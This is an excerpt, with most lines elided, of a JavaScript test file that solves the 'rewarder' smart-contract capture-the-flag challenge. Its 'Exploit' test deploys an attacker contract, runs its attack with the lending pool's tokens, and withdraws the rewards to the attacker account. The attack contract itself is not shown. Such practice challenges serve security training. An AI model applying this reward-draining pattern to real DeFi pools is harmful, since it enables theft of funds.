...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const RewarderAttackerFactor = await ethers.getContractFactory('RewarderAttacker', deployer);
        this.attackingContract = await RewarderAttackerFactor.deploy(
            attacker.address,
        ...
        this.attackingContract.attack(TOKENS_IN_LENDER_POOL);
        this.attackingContract.connect(attacker).withdrawRewards()
